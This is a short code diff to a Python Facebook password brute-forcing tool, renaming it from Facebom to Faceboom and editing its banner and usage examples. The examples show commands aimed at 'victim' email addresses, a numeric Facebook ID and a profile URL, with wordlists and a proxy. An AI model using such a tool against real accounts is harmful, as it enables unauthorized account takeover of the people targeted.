@@ -138,9 +138,9 @@ def FBOM(username, wordlist, proxy=None,passwd=None):
     proxystatus = prox+wi+"["+gr+"ON"+wi+"]" if useproxy !=False else yl+"["+rd+"OFF"+yl+"]"
     print(gr+"""
 ==================================
-[---]        """+wi+"""Facebom"""+gr+"""         [---]
+[---]        """+wi+"""Faceboom"""+gr+"""         [---]
 ==================================
-[---]  """+wi+"""BruteForce Facebook  """+gr+""" [---]
+[---]  """+wi+"""Bruteforcing Facebook  """+gr+""" [---]
 ==================================
 [---]         """+yl+"""CONFIG"""+gr+"""         [---]
 ==================================
@@ -223,7 +223,7 @@ def FBOM(username, wordlist, proxy=None,passwd=None):
     exit(1)
 
 parse = optparse.OptionParser(wi+"""
-Usage: python ./facebom.py [OPTIONS...]
+Usage: python ./faceboom.py [OPTIONS...]
 -------------
 OPTIONS:
        |
@@ -241,15 +241,15 @@ OPTIONS:
 Examples:
         |
      |--------
-     | python facebom.py -t victim@gmail.com -w /usr/share/wordlists/rockyou.txt
+     | python faceboom.py -t victim@gmail.com -w wlist.txt
      |--------
-     | python Facebom.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
+     | python Faceboom.py -t 100001013078780 -w wlist.txt
      |--------
-     | python facebom.py -t victim@hotmail.com -w D:\\wordlist.txt -p 35.236.37.121 default(port=8080,80) 
+     | python faceboom.py -t victim@hotmail.com -w wlist.txt -p 165.227.35.11 default(port=8080,80) 
      |--------
-     | python facebom.py -t victim@gmail.com -s 1234567
+     | python faceboom.py -t victim@gmail.com -s 1234567
      |-------- 
-     | python facebom.py -g https://www.facebook.com/alanwalker97 
+     | python faceboom.py -g https://www.facebook.com/victim-username 
      |-------- 
 """)
 def Main():
